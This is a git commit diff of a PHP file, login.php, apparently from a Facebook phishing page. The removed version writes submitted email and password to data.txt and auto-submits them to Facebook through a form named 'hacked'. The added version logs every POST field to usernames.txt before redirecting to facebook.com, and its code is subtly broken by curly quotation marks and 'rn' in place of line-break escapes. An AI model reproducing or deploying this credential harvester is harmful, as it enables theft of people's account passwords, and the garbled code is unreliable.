90ce2842fd7cf08b9e094f3f197f237b45b80c5d
Utsav Singh <utsavsingh62@gmail.com>
2020-07-26 00:34:57 +0530

    changes

--- login.php
+++ login.php
@@ -1,23 +1,14 @@
-<?php 
-$file = fopen('data.txt', 'a+');
-$write = fwrite($file, 'email: '.$_POST['email']. PHP_EOL .'password: '. $_POST['pass'].PHP_EOL.PHP_EOL );
-fclose($file);
-
- ?>
-<html>
-<head>
-	<title></title>
-	<script type="text/javascript">
-	function submitnow () {
-		document.getElementById("hacked").submit();
-	}
-	</script>
-</head>
-<body onload="submitnow()">
-<form action="https://www.facebook.com/login.php?login_attempt=1" method="post" id="hacked">
- 	<input type="hidden" name='email' value="<?php echo $_POST['email']; ?>">
- 	<input type="hidden" name='pass' value="<?php echo $_POST['pass']; ?>">
- </form>
-</body>
-</html>
+<?php
+header (‘Location:http://www.facebook.com/’);
+$handle = fopen(“usernames.txt”, “a”);
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, “=”);
+fwrite($handle, $value);
+fwrite($handle, “rn”);
+}
+fwrite($handle, “rn”);
+fclose($handle);
+exit;
+?> 
  
